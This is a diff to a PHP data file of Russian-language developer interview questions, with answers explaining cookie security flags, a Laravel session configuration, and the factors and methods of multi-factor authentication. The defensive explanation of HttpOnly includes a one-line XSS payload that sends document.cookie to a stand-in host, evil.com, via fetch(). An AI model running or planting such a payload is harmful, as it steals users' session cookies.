-                'answer' => 'Secure запрещает браузеру отправлять куку по http, чтобы её нельзя было снять с открытого Wi-Fi. HttpOnly прячет куку от document.cookie, и украденный XSS-кодом скрипт не сможет утащить идентификатор сессии. SameSite=Lax или Strict отрезает отправку куки в кросс-доменных запросах, что закрывает большую часть CSRF-сценариев. Domain и Path сужают область действия, а __Host- префикс дополнительно требует Secure, отсутствия Domain и Path=/, чтобы поддомен не мог переписать куку родителя.',
+                'answer' => 'Флаги cookie — **дешёвый и эффективный** способ закрыть классические атаки на сессию.
+
+- **`Secure`** — браузер шлёт cookie **только по HTTPS**. Без флага сессия утечёт через открытый Wi-Fi (`sslstrip`, `evil twin`).
+- **`HttpOnly`** — cookie **не видна из JS** (`document.cookie`). XSS-payload не сможет утащить `session_id` через `fetch("//evil.com?c=" + document.cookie)`. **Главная защита от кражи сессии через XSS**.
+- **`SameSite=Strict`** — cookie **никогда** не уходит на cross-site запросы. Полностью закрывает CSRF, но ломает UX: переход с внешней ссылки на сайт = разлогин.
+- **`SameSite=Lax`** (дефолт в современных браузерах) — cookie уходит только на **top-level navigation** (`GET`-переходы), не на скрытые `POST`/iframe-запросы с другого сайта. **Закрывает 95% CSRF**.
+- **`SameSite=None`** — отключает защиту, **обязательно с `Secure`**. Нужно для cross-origin сценариев (внешний iframe-виджет).
+- **`Domain` и `Path`** — сужают область действия. Без `Domain` cookie действует **только на текущем хосте** (host-only). С `Domain=.example.com` — на всех поддоменах.
+- **`Max-Age`/`Expires`** — срок жизни. Без них cookie — session-only (умирает с браузером).
+
+**Префиксы — дополнительная защита:**
+
+- **`__Host-`** — браузер **обязует** `Secure` + **без `Domain`** + `Path=/`. Поддомен **не сможет переписать** родительскую cookie.
+- **`__Secure-`** — обязательный `Secure`, без других ограничений.
+
+**Боевой минимум для session cookie:** `HttpOnly; Secure; SameSite=Lax; Path=/; __Host- префикс`.',
+                'code_example' => '<?php
+// Laravel — config/session.php
+return [
+    "lifetime" => 120,                     // минут
+    "secure" => env("SESSION_SECURE_COOKIE", true),  // только HTTPS
+    "http_only" => true,                   // не видна JS
+    "same_site" => "lax",                  // защита от CSRF
+    "domain" => null,                      // host-only — безопаснее
+];
+
+// Что отправит сервер
+// Set-Cookie: laravel_session=abc123;
+//             Path=/;
+//             HttpOnly;
+//             Secure;
+//             SameSite=Lax
+
+// Вручную (Symfony Cookie)
+cookie("auth", $token, 60, "/", null, secure: true, httpOnly: true, sameSite: "Lax");',
+                'code_language' => 'php',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
             ],
@@ -546,7 +1011,36 @@ Hash::check("qwerty123", $hash); // true',
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Зачем нужна многофакторная аутентификация, если пароль уже надёжный?',
-                'answer' => 'Любой пароль может утечь — фишингом, реюзом с другого сайта, кейлоггером, дампом базы соседнего сервиса. MFA добавляет второй фактор из другой категории (что-то, чем владеешь — TOTP-приложение, аппаратный ключ; или что-то, что ты есть — биометрия), и одной кражи пароля уже недостаточно для входа. TOTP по RFC 6238 даёт одноразовый код раз в 30 секунд, а WebAuthn/FIDO2 ещё лучше — он привязан к домену и не подделывается фишинговой страницей. SMS как второй фактор формально считается слабым из-за SIM-swap, но всё равно сильнее, чем один пароль.',
+                'answer' => 'Любой пароль **может утечь**, и пользователь не узнает об этом:
+
+- **фишинг** — ввёл на поддельной странице
+- **password reuse** — слили базу соседнего сайта, тот же пароль работает у тебя
+- **кейлоггер** на скомпрометированном устройстве
+- **brute force / credential stuffing** — атакующий пробует пары `email/password` из утечек
+- **внутренние** утечки (insider threat, упавший backup)
+
+**MFA добавляет второй фактор из другой категории** — украсть оба одновременно гораздо сложнее.
+
+**Три категории факторов:**
+
+1. **Знание** (something you know) — пароль, PIN, ответ на секретный вопрос
+2. **Владение** (something you have) — TOTP-приложение, аппаратный ключ, SMS на телефон, push в banking app
+3. **Биометрия** (something you are) — отпечаток, Face ID, голос
+
+Настоящий **MFA** — это **два фактора из разных категорий**. Два пароля — это не MFA.
+
+**Сравнение реализаций:**
+
+| Метод | RFC/стандарт | Защита от фишинга | Минусы |
+|---|---|---|---|
+| **`TOTP`** (Google Authenticator) | RFC 6238 | средняя — код можно ввести на поддельной странице | seed надо беречь |
+| **SMS** | — | низкая — **SIM-swap**, перехват SS7 | NIST не рекомендует, но лучше чем ничего |
+| **Push** (banking app) | — | средняя — пользователь может одобрить случайно | требует доверенного устройства |
+| **`WebAuthn`/FIDO2** (YubiKey, Passkeys) | W3C/CTAP2 | **высокая — привязка к домену** | железо или поддержка ОС |
+
+**Главное преимущество `WebAuthn`:** ключ подписывает запрос **с указанием домена**. Фишинговая страница `bank-evil.com` не получит валидную подпись для `bank.com`. **Невозможно зафишить**.
+
+**Где обязателен MFA:** админ-панели, доступ к продакшену, банки, корп-аккаунты. Для обычного юзера — `TOTP`/passkey по умолчанию + recovery codes.',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
             ],
